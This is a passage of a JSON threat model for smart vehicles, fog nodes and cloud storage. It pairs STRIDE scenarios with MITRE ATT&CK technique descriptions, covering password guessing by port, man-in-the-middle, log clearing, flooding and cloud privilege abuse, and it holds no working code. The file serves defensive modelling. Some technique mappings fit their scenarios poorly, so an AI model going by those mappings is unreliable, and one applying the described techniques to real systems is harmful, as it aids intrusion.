                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data packets sent from smart vehicles to fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Data packets between smart vehicles and fog nodes are not encrypted.",
                    "Role": "Attacker",
                    "Condition": "Valid if there is a lack of encryption on data packets."
                },
                {
                    "Assumption": "The attacker has access to the communication channel between the vehicle and fog node.",
                    "Role": "Attacker",
                    "Condition": "Valid if the network is not secured."
                },
                {
                    "Assumption": "Integrity checks are not performed on received data packets.",
                    "Role": "System Designer",
                    "Condition": "Valid if integrity validation mechanisms are not implemented."
                }
            ],
            "Potential Impact": "Data integrity is compromised, leading to incorrect data processing and decision-making.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "data packets",
                "communications",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious actors manipulate firmware on fog nodes to alter their behavior.",
            "Assumptions": [
                {
                    "Assumption": "Firmware on fog nodes is not protected by cryptographic signatures.",
                    "Role": "Attacker",
                    "Condition": "Valid if firmware lacks cryptographic integrity checks."
                },
                {
                    "Assumption": "Attackers can upload or replace firmware on exposed fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Valid if physical or remote access controls are weak."
                },
                {
                    "Assumption": "The system does not regularly perform integrity checks on fog node firmware.",
                    "Role": "System Designer",
                    "Condition": "Valid if periodic checks and updates are not enforced."
                }
            ],
            "Potential Impact": "Firmware tampering can disrupt service availability and compromise data integrity and confidentiality.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "device",
                "integrity"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An insider modifies data stored on cloud servers to manipulate analytics results.",
            "Assumptions": [
                {
                    "Assumption": "Cloud server access control is not tightly regulated.",
                    "Role": "Insider",
                    "Condition": "Valid if access controls are lax."
                },
                {
                    "Assumption": "The insider has sufficient privileges to alter stored data.",
                    "Role": "Insider",
                    "Condition": "Valid if access permissions are overly broad."
                },
                {
                    "Assumption": "There are no audit logs or monitoring of data changes.",
                    "Role": "System Designer",
                    "Condition": "Valid if the system lacks proper logging and monitoring."
                }
            ],
            "Potential Impact": "Compromised data integrity, leading to incorrect analytics and decision-making.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "insider threat",
                "cloud",
                "data integrity"
            ],
            "mitre_technique": {
                "name": "Modify Cloud Compute Infrastructure",
                "description": "An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\n\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.(Citation: Mandiant M-Trends 2020)",
                "id": "attack-pattern--144e007b-e638-431d-a894-45d90c54ab90",
                "technique_id": "T1578"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A driver denies having transmitted certain data from their smart vehicle.",
            "Assumptions": [
                {
                    "Assumption": "Data transmissions from smart vehicles are not logged or timestamped.",
                    "Role": "Driver",
                    "Condition": "Valid if system lacks logging."
                },
                {
                    "Assumption": "The system does not use unique identifiers for transactions.",
                    "Role": "System Designer",
                    "Condition": "Valid if there's no transaction tracking."
                },
                {
                    "Assumption": "No strong authentication mechanisms are used.",
                    "Role": "System Designer",
                    "Condition": "Valid if data submissions lack authentication."
                }
            ],
            "Potential Impact": "Potential disputes and challenges in data authenticity and non-repudiation.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "authentication",
                "data transmission"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A fog node operator denies having made certain configuration changes.",
            "Assumptions": [
                {
                    "Assumption": "System configuration changes are not logged with sufficient detail.",
                    "Role": "Fog Node Operator",
                    "Condition": "Valid if there is a lack of detailed logging."
                },
                {
                    "Assumption": "No role-based access control is enforced on configuration changes.",
                    "Role": "System Designer",
                    "Condition": "Valid if access controls are inadequate."
                },
                {
                    "Assumption": "Logs are not immutable and can be altered.",
                    "Role": "System Designer",
                    "Condition": "Valid if log tampering is possible."
                }
            ],
            "Potential Impact": "Challenges in tracking and validating operational changes, potentially impacting system stability and security.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "configuration control",
                "logging",
                "access control"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user disputes having accessed sensitive data on the cloud.",
            "Assumptions": [
                {
                    "Assumption": "User access to cloud data is not comprehensively logged.",
                    "Role": "User",
                    "Condition": "Valid if access logs are incomplete."
                },
                {
                    "Assumption": "Logs do not include user identification and activity timestamps.",
                    "Role": "System Designer",
                    "Condition": "Valid if logs lack detailed user activity records."
                },
                {
                    "Assumption": "Logs are not regularly reviewed or audited for anomalies.",
                    "Role": "System Administrator",
                    "Condition": "Valid if there is no log review process in place."
                }
            ],
            "Potential Impact": "Issues in validating data access and potential unauthorized data usage going undetected.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "access control",
                "cloud",
                "logging"
            ],
            "mitre_technique": {
                "name": "Additional Cloud Roles",
                "description": "An adversary may add additional roles or permissions to an adversary-controlled cloud account to maintain persistent access to a tenant. For example, adversaries may update IAM policies in cloud-based environments or add a new global administrator in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation: Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins).(Citation: Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity. Adversaries may also modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have compromised. This could lead to privilege escalation, particularly if the roles added allow for lateral movement to additional accounts.\n\nFor example, in AWS environments, an adversary with appropriate permissions may be able to use the <code>CreatePolicyVersion</code> API to define a new version of an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy with additional or distinct permissions to a compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries may add roles to adversary-controlled accounts outside the victim cloud tenant. This allows these external accounts to perform actions inside the victim tenant without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136) or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)",
                "id": "attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3",
                "technique_id": "T1098.003"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker eavesdrops on unencrypted data transmissions between smart vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Data transmissions are not encrypted.",
                    "Role": "Attacker",
                    "Condition": "Valid if data is sent in plaintext."
                },
                {
                    "Assumption": "The attacker has access to the communication channels.",
                    "Role": "Attacker",
                    "Condition": "Valid if the network is compromised."
                },
                {
                    "Assumption": "No additional data obfuscation or protection measures are in place.",
                    "Role": "System Designer",
                    "Condition": "Valid if there are no protective measures."
                }
            ],
            "Potential Impact": "Sensitive data could be exposed, compromising confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "eavesdropping",
                "data transmission",
                "encryption"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive data stored on fog nodes is accessed by unauthorized individuals.",
            "Assumptions": [
                {
                    "Assumption": "Access controls on fog nodes are weak or misconfigured.",
                    "Role": "Unauthorized Individual",
                    "Condition": "Valid if access controls are ineffective."
                },
                {
                    "Assumption": "Data on fog nodes is not encrypted at rest.",
                    "Role": "System Designer",
                    "Condition": "Valid if data encryption is not implemented."
                },
                {
                    "Assumption": "No mechanism for detecting unauthorized access is in place.",
                    "Role": "System Designer",
                    "Condition": "Valid if there is no monitoring."
                }
            ],
            "Potential Impact": "Unauthorized individuals could access sensitive data, compromising its confidentiality.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "fog node",
                "access control",
                "data encryption"
            ],
            "mitre_technique": {
                "name": "File and Directory Permissions Modification",
                "description": "Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).\n\nModifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).\n\nAdversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) ",
                "id": "attack-pattern--65917ae0-b854-4139-83fe-bf2441cf0196",
                "technique_id": "T1222"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Cloud data breach exposes sensitive vehicle-generated data.",
            "Assumptions": [
                {
                    "Assumption": "Cloud data storage is not encrypted.",
                    "Role": "Attacker",
                    "Condition": "Valid if cloud data is in plaintext."
                },
                {
                    "Assumption": "Weak cloud access controls allow unauthorized access.",
                    "Role": "Attacker",
                    "Condition": "Valid if access controls are inadequate."
                },
                {
                    "Assumption": "Insufficient monitoring of cloud access activities.",
                    "Role": "System Designer",
                    "Condition": "Valid if cloud access is not monitored."
                }
            ],
            "Potential Impact": "Exposure of sensitive information could lead to privacy violations and regulatory issues.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "cloud",
                "data breach",
                "access control"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Distributed Denial of Service (DDoS) attack against fog nodes, rendering them inoperable.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes are not protected by DDoS mitigation tools.",
                    "Role": "Attacker",
                    "Condition": "Valid if there are no DDoS protections."
                },
                {
                    "Assumption": "Network traffic is not monitored for anomalies.",
                    "Role": "System Designer",
                    "Condition": "Valid if there is no traffic monitoring."
                },
                {
                    "Assumption": "Attackers have sufficient resources to launch large-scale DDoS.",
                    "Role": "Attacker",
                    "Condition": "Valid if attackers can amass enough resources."
                }
            ],
            "Potential Impact": "Service interruption, preventing vehicles from receiving critical data and updates.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "DDoS",
                "fog node",
                "network congestion"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Memory exhaustion attack on fog nodes causes system crashes.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes do not have adequate resource management and monitoring.",
                    "Role": "Attacker",
                    "Condition": "Valid if resource usage is not managed."
                },
                {
                    "Assumption": "Attackers can send malformed data packets to exhaust memory.",
                    "Role": "Attacker",
                    "Condition": "Valid if malformed packets are not filtered."
                },
                {
                    "Assumption": "There are no mechanisms to detect and prevent such attacks.",
                    "Role": "System Designer",
                    "Condition": "Valid if there is no attack detection."
                }
            ],
            "Potential Impact": "System outages, leading to loss of data processing capability.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "memory exhaustion",
                "fog node",
                "system crash"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Flooding attack on communication channels between smart vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "The communication channels do not have traffic throttling mechanisms.",
                    "Role": "Attacker",
                    "Condition": "Valid if traffic is not throttled."
                },
                {
                    "Assumption": "Attackers can control multiple devices to flood the network.",
                    "Role": "Attacker",
                    "Condition": "Valid if attackers can use botnets."
                },
                {
                    "Assumption": "System does not prioritize traffic, allowing flooding to disrupt services.",
                    "Role": "System Designer",
                    "Condition": "Valid if prioritization is not implemented."
                }
            ],
            "Potential Impact": "Disruption of communication and data flow between vehicles and fog nodes.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "flooding",
                "communication channel",
                "network traffic"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains administrative privileges on fog nodes through exploitation of software vulnerabilities.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes run software with known vulnerabilities.",
                    "Role": "Attacker",
                    "Condition": "Valid if vulnerabilities are unpatched."
                },
                {
                    "Assumption": "Attackers have knowledge of the vulnerabilities and necessary exploit tools.",
                    "Role": "Attacker",
                    "Condition": "Valid if exploit information is accessible."
                },
                {
                    "Assumption": "Adequate privilege escalation protections are not in place.",
                    "Role": "System Designer",
                    "Condition": "Valid if privilege controls are weak."
                }
            ],
            "Potential Impact": "Compromised control over fog nodes, leading to potential data tampering and service disruption.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "administrative access",
                "exploitation",
                "software vulnerabilities"
            ],
            "mitre_technique": {
                "name": "Exploitation for Privilege Escalation",
                "description": "Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020) Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) or [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570).",
                "id": "attack-pattern--b21c3b2d-02e6-45b1-980b-e69051040839",
                "technique_id": "T1068"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user exploits misconfigurations in cloud services to gain higher access levels than intended.",
            "Assumptions": [
                {
                    "Assumption": "Cloud services have misconfigured access control rules.",
                    "Role": "User",
                    "Condition": "Valid if access controls are misconfigured."
                },
                {
                    "Assumption": "The user has the capability to identify and exploit these misconfigurations.",
                    "Role": "User",
                    "Condition": "Valid if user has knowledge and tools."
                },
                {
                    "Assumption": "There is no continuous monitoring of access control changes.",
                    "Role": "System Designer",
                    "Condition": "Valid if access controls changes go undetected."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data and administrative functions.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "cloud services",
                "access control",
                "misconfiguration"
            ],
            "mitre_technique": {
                "name": "Data from Cloud Storage",
                "description": "Adversaries may access data from cloud storage.\n\nMany IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform. \n\nIn some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though the [Cloud API](https://attack.mitre.org/techniques/T1059/009). In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e., [Data from Information Repositories](https://attack.mitre.org/techniques/T1213)). \n\nAdversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.(Citation: Amazon S3 Security, 2019)(Citation: Microsoft Azure Storage Security, 2019)(Citation: Google Cloud Storage Best Practices, 2019) There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.\n\nThis open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)\n\nAdversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
                "id": "attack-pattern--3298ce88-1628-43b1-87d9-0b5336b193d7",
                "technique_id": "T1530"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
